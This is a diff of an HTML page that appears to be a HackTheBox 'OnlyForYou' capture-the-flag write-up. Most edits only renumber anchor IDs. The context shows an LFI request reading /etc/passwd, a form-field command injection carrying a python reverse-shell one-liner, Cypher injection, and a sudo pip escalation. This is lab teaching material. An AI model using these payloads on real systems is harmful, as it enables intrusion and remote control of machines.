@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2023-07-12 Wed 22:26 -->
+<!-- 2023-07-12 Wed 22:35 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>OnlyForYou</title>
@@ -29,50 +29,50 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org42ca9c9">Notes</a>
+<li><a href="#org52afba5">Notes</a>
 <ul>
-<li><a href="#org5d24275">Scans</a>
+<li><a href="#org4e8e1a9">Scans</a>
 <ul>
-<li><a href="#org14fbc9b">nmap</a></li>
-<li><a href="#org965c2a4">Attempted Gobust</a></li>
-<li><a href="#orgdad86a1">Finding subdomains with ffuf</a></li>
+<li><a href="#org6a6277e">nmap</a></li>
+<li><a href="#org2b48264">Attempted Gobust</a></li>
+<li><a href="#orgb4055b3">Finding subdomains with ffuf</a></li>
 </ul>
 </li>
-<li><a href="#org70867c6">beta.only4you.htb</a>
+<li><a href="#org40c59ad">beta.only4you.htb</a>
 <ul>
-<li><a href="#orgb443882">beta.only4you.htb source code.</a></li>
-<li><a href="#org18ba659">LFI and Foothold</a></li>
+<li><a href="#org867705f">beta.only4you.htb source code.</a></li>
+<li><a href="#org0209c6c">LFI and Foothold</a></li>
 </ul>
 </li>
-<li><a href="#org4c659b8">Foothold enumeration</a>
+<li><a href="#orgdd5239d">Foothold enumeration</a>
 <ul>
-<li><a href="#org8a6324d">Inspecting the ports</a></li>
+<li><a href="#org881050b">Inspecting the ports</a></li>
 </ul>
 </li>
-<li><a href="#orgce10e22">onlyforyou</a></li>
-<li><a href="#org6d92414">root.</a></li>
+<li><a href="#org70211d5">onlyforyou</a></li>
+<li><a href="#org62fcc89">root.</a></li>
 </ul>
 </li>
 </ul>
 </div>
 </div>
 
-<div id="outline-container-org42ca9c9" class="outline-2">
-<h2 id="org42ca9c9">Notes</h2>
-<div class="outline-text-2" id="text-org42ca9c9">
+<div id="outline-container-org52afba5" class="outline-2">
+<h2 id="org52afba5">Notes</h2>
+<div class="outline-text-2" id="text-org52afba5">
 <ul class="org-ul">
 <li>Difficulty: medium, hard if you mess the enumeration up.</li>
 </ul>
 </div>
 
 
-<div id="outline-container-org5d24275" class="outline-3">
-<h3 id="org5d24275">Scans</h3>
-<div class="outline-text-3" id="text-org5d24275">
+<div id="outline-container-org4e8e1a9" class="outline-3">
+<h3 id="org4e8e1a9">Scans</h3>
+<div class="outline-text-3" id="text-org4e8e1a9">
 </div>
-<div id="outline-container-org14fbc9b" class="outline-4">
-<h4 id="org14fbc9b">nmap</h4>
-<div class="outline-text-4" id="text-org14fbc9b">
+<div id="outline-container-org6a6277e" class="outline-4">
+<h4 id="org6a6277e">nmap</h4>
+<div class="outline-text-4" id="text-org6a6277e">
 <p>
 As always start off with the nmap.
 </p>
@@ -87,7 +87,7 @@ The nmap flag <code>-A</code> enables os detection, version detection and script
 Flag <code>-oA</code> outputs in all formats.
 </p>
 
-<pre class="example" id="org4f24895">
+<pre class="example" id="org83f9a28">
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-22 15:44 EDT
 Nmap scan report for 10.129.62.243
 Host is up (0.12s latency).
@@ -131,7 +131,7 @@ From the Nmap scan, only two ports are exposed: 22 and 80.
 Additionally, there is a domain called <code>only4you.htb</code>. Please add this domain to your <code>/etc/hosts</code> file.
 </p>
 
-<pre class="example" id="org2a85eb6">
+<pre class="example" id="orge45cebb">
 10.129.62.243 only4you.htb
 </pre>
 
@@ -140,9 +140,9 @@ The server is running Nginx, which is a newer version. It is unlikely that there
 </p>
 </div>
 </div>
-<div id="outline-container-org965c2a4" class="outline-4">
-<h4 id="org965c2a4">Attempted Gobust</h4>
-<div class="outline-text-4" id="text-org965c2a4">
+<div id="outline-container-org2b48264" class="outline-4">
+<h4 id="org2b48264">Attempted Gobust</h4>
+<div class="outline-text-4" id="text-org2b48264">
 <p>
 Whenever I encounter a web service on an HTB machine, I always run Gobuster to search for hidden directories or files. However, on this machine, there doesn't seem to be much to find using Gobuster.
 </p>
@@ -151,7 +151,7 @@ Whenever I encounter a web service on an HTB machine, I always run Gobuster to s
 <pre class="src src-sh">gobuster dir -w ~/wordlists/Discovery/Web-Content/big.txt --url http://only4you.htb/ -o scans/only4you.gobust
 </pre>
 </div>
-<pre class="example" id="orge55671f">
+<pre class="example" id="orgf5b11df">
 ===============================================================
 Gobuster v3.5
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
@@ -175,9 +175,9 @@ Progress: 20459 / 20476 (99.92%)
 </div>
 
 
-<div id="outline-container-orgdad86a1" class="outline-4">
-<h4 id="orgdad86a1">Finding subdomains with ffuf</h4>
-<div class="outline-text-4" id="text-orgdad86a1">
+<div id="outline-container-orgb4055b3" class="outline-4">
+<h4 id="orgb4055b3">Finding subdomains with ffuf</h4>
+<div class="outline-text-4" id="text-orgb4055b3">
 <p>
 Thanks to the great work of IppSec, I learned a useful trick that will help me on future HTB boxes.<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>
 </p>
@@ -189,7 +189,7 @@ I had to filter out status code 301.
 <pre class="src src-sh">ffuf -u http://10.129.62.243 -H <span style="font-style: italic;">"Host: FUZZ.only4you.htb"</span> -w ~/wordlists/Discovery/DNS/subdomains-top1million-110000.txt -fc 301
 </pre>
 </div>
-<pre class="example" id="org7c0e758">
+<pre class="example" id="org3bbe1a9">
 
         /'___\  /'___\           /'___\
        /\ \__/ /\ \__/  __  __  /\ \__/
@@ -225,9 +225,9 @@ I have found a new subdomain - <code>beta.only4you.htb</code>. Please add this t
 </div>
 </div>
 </div>
-<div id="outline-container-org70867c6" class="outline-3">
-<h3 id="org70867c6">beta.only4you.htb</h3>
-<div class="outline-text-3" id="text-org70867c6">
+<div id="outline-container-org40c59ad" class="outline-3">
+<h3 id="org40c59ad">beta.only4you.htb</h3>
+<div class="outline-text-3" id="text-org40c59ad">
 <p>
 Now that we have found the subdomain, it's time to explore it. The subdomain hosts an image converting web app, and the source code for the app is a simple Flask web app.
 </p>
@@ -237,9 +237,9 @@ Now that we have found the subdomain, it's time to explore it. The subdomain hos
 </p>
 </div>
 
-<div id="outline-container-orgb443882" class="outline-4">
-<h4 id="orgb443882">beta.only4you.htb source code.</h4>
-<div class="outline-text-4" id="text-orgb443882">
+<div id="outline-container-org867705f" class="outline-4">
+<h4 id="org867705f">beta.only4you.htb source code.</h4>
+<div class="outline-text-4" id="text-org867705f">
 <p>
 Here is the app.py file, which contains all of the logic for routing within the web application.
 </p>
@@ -393,9 +393,9 @@ This means that any attempt to use a relative path with <code>..</code> or <code
 </p>
 </div>
 </div>
-<div id="outline-container-org18ba659" class="outline-4">
-<h4 id="org18ba659">LFI and Foothold</h4>
-<div class="outline-text-4" id="text-org18ba659">
+<div id="outline-container-org0209c6c" class="outline-4">
+<h4 id="org0209c6c">LFI and Foothold</h4>
+<div class="outline-text-4" id="text-org0209c6c">
 <p>
 So in order to abuse the LFI you simply need to send a POST req to the /download endpoint with a image argument in the body
 </p>
@@ -404,7 +404,7 @@ So in order to abuse the LFI you simply need to send a POST req to the /download
 Here is an example request
 </p>
 
-<pre class="example" id="org37169a7">
+<pre class="example" id="org7754cba">
 POST http://beta.only4you.htb/download HTTP/1.1
 Host: beta.only4you.htb
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0
@@ -428,7 +428,7 @@ image=/etc/passwd
 <p>
 Here is /etc/passwd
 </p>
-<pre class="example" id="org81a03be">
+<pre class="example" id="orgb3f0c26">
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -482,7 +482,7 @@ Lets try and find the config for the web applications.
 The default config is at <code>/etc/nginx/sites-enabled/default</code>
 Here is the config
 </p>
-<pre class="example" id="org9e9fc9d">
+<pre class="example" id="orgd59298e">
 server {
     listen 80;
     return 301 http://only4you.htb$request_uri;
@@ -673,7 +673,7 @@ Start up pwncat or ncat
 <p>
 Here is the request with the injection
 </p>
-<pre class="example" id="org659d067">
+<pre class="example" id="org7cb963a">
 POST http://only4you.htb/ HTTP/1.1
 Host: only4you.htb
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0
@@ -698,9 +698,9 @@ name=lololol%40gmail.com&amp;email=lol@gmail.com; python3 -c 'import socket,subp
 </div>
 
 
-<div id="outline-container-org4c659b8" class="outline-3">
-<h3 id="org4c659b8">Foothold enumeration</h3>
-<div class="outline-text-3" id="text-org4c659b8">
+<div id="outline-container-orgdd5239d" class="outline-3">
+<h3 id="orgdd5239d">Foothold enumeration</h3>
+<div class="outline-text-3" id="text-orgdd5239d">
 <p>
 Now that I have a foothold, it's time to enumerate with LinPEAS.
 </p>
@@ -713,7 +713,7 @@ I'll leave the exercise of uploading a tool to the target host as an exercise fo
 The following is a great example of why you should always run <code>netstat</code>:
 </p>
 
-<pre class="example" id="orgd6e1fc7">
+<pre class="example" id="org0d7a95e">
 tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      -
 tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
 tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
@@ -731,9 +731,9 @@ We can see the two ports 80 and 22 from our nmap, but we can also see that MySQL
 </p>
 </div>
 
-<div id="outline-container-org8a6324d" class="outline-4">
-<h4 id="org8a6324d">Inspecting the ports</h4>
-<div class="outline-text-4" id="text-org8a6324d">
+<div id="outline-container-org881050b" class="outline-4">
+<h4 id="org881050b">Inspecting the ports</h4>
+<div class="outline-text-4" id="text-org881050b">
 <p>
 But how do we access it? We use a proxy on the victim host to "pivot" to the port we need.
 </p>
@@ -744,8 +744,8 @@ I use chisel since that is what was recommended to me.<sup><a id="fnr.5" class="
 </div>
 
 <ul class="org-ul">
-<li><a id="org30e1de1"></a>Neo4j ports<br />
-<div class="outline-text-5" id="text-org30e1de1">
+<li><a id="org6f1b0c3"></a>Neo4j ports<br />
+<div class="outline-text-5" id="text-org6f1b0c3">
 <p>
 By looking up some of the ports, we find that it is neo4j (you might already know that from the passwd file).
 This table is from the Documentation for neo4j.<sup><a id="fnr.6" class="footref" href="#fn.6" role="doc-backlink">6</a></sup>
@@ -845,8 +845,8 @@ This table is from the Documentation for neo4j.<sup><a id="fnr.6" class="footref
 </div>
 </li>
 
-<li><a id="org433b266"></a>GOG's<br />
-<div class="outline-text-5" id="text-org433b266">
+<li><a id="org724b97d"></a>GOG's<br />
+<div class="outline-text-5" id="text-org724b97d">
 <p>
 Gogs and Gitea listen on port 3000. There is nothing interesting about that yet.
 </p>
@@ -855,9 +855,9 @@ Gogs and Gitea listen on port 3000. There is nothing interesting about that yet.
 </ul>
 </div>
 </div>
-<div id="outline-container-orgce10e22" class="outline-3">
-<h3 id="orgce10e22">onlyforyou</h3>
-<div class="outline-text-3" id="text-orgce10e22">
+<div id="outline-container-org70211d5" class="outline-3">
+<h3 id="org70211d5">onlyforyou</h3>
+<div class="outline-text-3" id="text-org70211d5">
 <p>
 There is a simple web app and you can find the default credentials are admin:admin. Navigating around, we can see a search page, and based on the fact we know Neo4j is running, Cypher injection is the correct route.
 I came to realize this when fuzzing the search page for <a href="20221213185522-sql_injection.html#ID-81d62666-4ce8-4244-b498-739a680f9673">SQL Injection</a>.
@@ -883,9 +883,9 @@ This credential also works with John on the Gogs and SSH.
 </div>
 </div>
 
-<div id="outline-container-org6d92414" class="outline-3">
-<h3 id="org6d92414">root.</h3>
-<div class="outline-text-3" id="text-org6d92414">
+<div id="outline-container-org62fcc89" class="outline-3">
+<h3 id="org62fcc89">root.</h3>
+<div class="outline-text-3" id="text-org62fcc89">
 <p>
 Always check your privileges with <code>sudo -l</code>. In this case, running pip download as root can execute code when in the tar.gz format.
 </p>
